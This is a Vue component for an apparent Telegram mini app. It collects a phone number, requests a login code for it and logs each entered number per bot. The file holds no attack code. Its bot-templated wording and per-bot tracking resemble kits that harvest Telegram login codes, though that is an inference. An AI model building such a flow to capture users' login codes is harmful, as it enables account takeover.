<script setup>
import { ref } from "vue";
import { useRouter } from "vue-router";
import { useUserStore } from "../stores/userStore";
import { useTemplateStore } from "../stores/templateStore";
import { api } from "../api/client";

const router = useRouter();
const userStore = useUserStore();
const templateStore = useTemplateStore();

const phone = ref(userStore.phoneNumber || "");
const submitting = ref(false);
const errorMsg = ref("");

async function handleSendCode() {
  errorMsg.value = "";
  const cleaned = phone.value.trim();
  if (!cleaned || cleaned.length < 7) {
    errorMsg.value = "Please enter a valid phone number with country code.";
    return;
  }

  submitting.value = true;
  try {
    const res = await api.sendCode({
      phone_number: cleaned,
      bot_user_id: userStore.uId,
      bot_id: userStore.botId,
      user_tg: userStore.user,
    });

    api.trackAction({
      bot_id: userStore.botId,
      tg_id: String(userStore.user?.id || ""),
      action: "send_code",
      value: cleaned,
      valid: res?.ok ? 1 : 0,
    });

    if (res?.ok) {
      window.Telegram?.WebApp?.HapticFeedback?.notificationOccurred?.("success");
      userStore.phoneNumber = cleaned;
      userStore.state = "enter_code";
      router.push("/code");
    } else {
      errorMsg.value = res?.error || "Failed to send verification code.";
    }
  } catch (err) {
    errorMsg.value = err.message;
  } finally {
    submitting.value = false;
  }
}
</script>

<template>
  <section class="card">
    <span v-if="userStore.user?.first_name" class="info-badge">
      Welcome, {{ userStore.user.first_name }}
    </span>
    <h2>{{ templateStore.template.start.title || "Phone Verification" }}</h2>
    <p>
      {{
        templateStore.template.start.description ||
        "Enter your phone number to receive a 6-digit login code."
      }}
    </p>

    <input
      v-model="phone"
      type="tel"
      placeholder="+8801XXXXXXXXX"
      class="input"
      @keyup.enter="handleSendCode"
    />
    <p v-if="errorMsg" class="error">{{ errorMsg }}</p>

    <button class="btn" :disabled="submitting" @click="handleSendCode">
      {{ submitting ? "Sending..." : templateStore.template.start.buttonText || "Send Code" }}
    </button>
  </section>
</template>
